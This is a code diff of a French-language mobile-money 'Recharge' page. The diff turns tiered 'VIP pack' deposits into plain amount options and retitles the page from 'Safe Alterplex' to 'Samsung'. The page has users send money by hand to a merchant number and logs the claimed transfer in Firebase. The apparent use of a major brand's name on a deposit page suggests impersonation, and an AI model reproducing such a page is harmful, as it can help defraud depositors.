@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe Alterplex - Recharge</title>
+    <title>Samsung - Recharge</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -59,14 +59,14 @@
             gap: 8px;
         }
 
-        /* Grille des montants VIP (8 Packs) */
-        .vip-grid {
+        /* Grille des montants standard */
+        .amount-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 10px;
         }
 
-        .vip-card {
+        .amount-card {
             background: #fff;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
@@ -76,20 +76,20 @@
             transition: all 0.2s ease;
         }
 
-        .vip-card.selected {
+        .amount-card.selected {
             border-color: #000;
             background: #f0f0f0;
             transform: scale(1.02);
         }
 
-        .vip-name {
+        .amount-label {
             font-size: 11px;
             font-weight: 800;
             color: #666;
             text-transform: uppercase;
         }
 
-        .vip-price {
+        .amount-price {
             font-size: 15px;
             font-weight: 900;
             color: #000;
@@ -256,54 +256,51 @@
 </head>
 <body>
 
-    <!-- En-tête -->
     <div class="top-header">
         <a href="profil.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
-        <div class="brand-title">Recharge de Compte</div>
+        <div class="brand-title">Samsung - Recharge de Compte</div>
     </div>
 
     <div class="container">
 
-        <!-- 1. Sélection des montants VIP -->
         <div class="section-title">
-            <i class="fas fa-layer-group"></i> 1. Choisissez le montant (Packs VIP)
+            <i class="fas fa-layer-group"></i> 1. Choisissez le montant de recharge
         </div>
-        <div class="vip-grid">
-            <div class="vip-card selected" onclick="selectVip(this, 4000, 'Card 1')">
-                <div class="vip-name">Card 1</div>
-                <div class="vip-price">4 000 FC</div>
+        <div class="amount-grid">
+            <div class="amount-card selected" onclick="selectAmount(this, 4000)">
+                <div class="amount-label">Option 1</div>
+                <div class="amount-price">4 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 20000, 'Card 2')">
-                <div class="vip-name">Card 2</div>
-                <div class="vip-price">20 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 20000)">
+                <div class="amount-label">Option 2</div>
+                <div class="amount-price">20 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 80000, 'Card 3')">
-                <div class="vip-name">Card 3</div>
-                <div class="vip-price">80 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 80000)">
+                <div class="amount-label">Option 3</div>
+                <div class="amount-price">80 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 150000, 'Card 4')">
-                <div class="vip-name">Card 4</div>
-                <div class="vip-price">150 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 150000)">
+                <div class="amount-label">Option 4</div>
+                <div class="amount-price">150 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 300000, 'Card 5')">
-                <div class="vip-name">Card 5</div>
-                <div class="vip-price">300 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 300000)">
+                <div class="amount-label">Option 5</div>
+                <div class="amount-price">300 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 500000, 'Card 6')">
-                <div class="vip-name">Card 6</div>
-                <div class="vip-price">500 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 500000)">
+                <div class="amount-label">Option 6</div>
+                <div class="amount-price">500 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 700000, 'Card 7')">
-                <div class="vip-name">Card 7</div>
-                <div class="vip-price">700 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 700000)">
+                <div class="amount-label">Option 7</div>
+                <div class="amount-price">700 000 FC</div>
             </div>
-            <div class="vip-card" onclick="selectVip(this, 1500000, 'Card 8')">
-                <div class="vip-name">Card 8</div>
-                <div class="vip-price">1 500 000 FC</div>
+            <div class="amount-card" onclick="selectAmount(this, 1500000)">
+                <div class="amount-label">Option 8</div>
+                <div class="amount-price">1 500 000 FC</div>
             </div>
         </div>
 
-        <!-- 2. Sélection du Mode de Paiement -->
         <div class="section-title">
             <i class="fas fa-wallet"></i> 2. Effectuez le transfert manuellement
         </div>
@@ -322,7 +319,6 @@
             </div>
         </div>
 
-        <!-- Box d'affichage du numéro à copier -->
         <div id="merchantBox" class="merchant-box">
             <div class="merchant-title">Envoyez le montant sur ce numéro :</div>
             <div class="merchant-number-wrap">
@@ -331,7 +327,6 @@
             </div>
         </div>
 
-        <!-- 3. Confirmation de la Transaction -->
         <div class="section-title">
             <i class="fas fa-receipt"></i> 3. Confirmez votre dépôt
         </div>
@@ -353,7 +348,6 @@
 
     </div>
 
-    <!-- Navigation du Bas -->
     <nav class="bottom-nav">
         <a href="dashboard.html" class="nav-item">
             <i class="fas fa-house nav-icon"></i>Accueil
@@ -374,18 +368,16 @@
         const userPhone = localStorage.getItem('userPhone') || '890000000';
 
         let selectedAmount = 4000;
-        let selectedVipName = "Card 1";
         let selectedMethod = "";
         let recipientPhone = "";
 
         // Auto-remplir le numéro expéditeur
         document.getElementById('payPhone').value = userPhone;
 
-        function selectVip(element, amount, name) {
-            document.querySelectorAll('.vip-card').forEach(card => card.classList.remove('selected'));
+        function selectAmount(element, amount) {
+            document.querySelectorAll('.amount-card').forEach(card => card.classList.remove('selected'));
             element.classList.add('selected');
             selectedAmount = amount;
-            selectedVipName = name;
         }
 
         function selectMethod(element, method, targetPhone) {
@@ -414,7 +406,7 @@
             const transactionId = document.getElementById('transactionId').value.trim();
 
             if (selectedAmount === 0) {
-                alert("Veuillez sélectionner un pack VIP.");
+                alert("Veuillez sélectionner un montant.");
                 return;
             }
 
@@ -437,7 +429,6 @@
                 // Enregistrement de la demande dans Firebase
                 const depositRecord = {
                     amount: selectedAmount,
-                    vipPack: selectedVipName,
                     method: selectedMethod,
                     senderPhone: senderPhone,
                     recipientPhone: recipientPhone,
@@ -446,7 +437,7 @@
                     createdAt: new Date().toISOString()
                 };
 
-                await fetch(`${dbUrl}/recharges/${userPhone}.json`, {
+                await fetch(`${dbUrl}/recharges/${encodeURIComponent(userPhone)}.json`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(depositRecord)
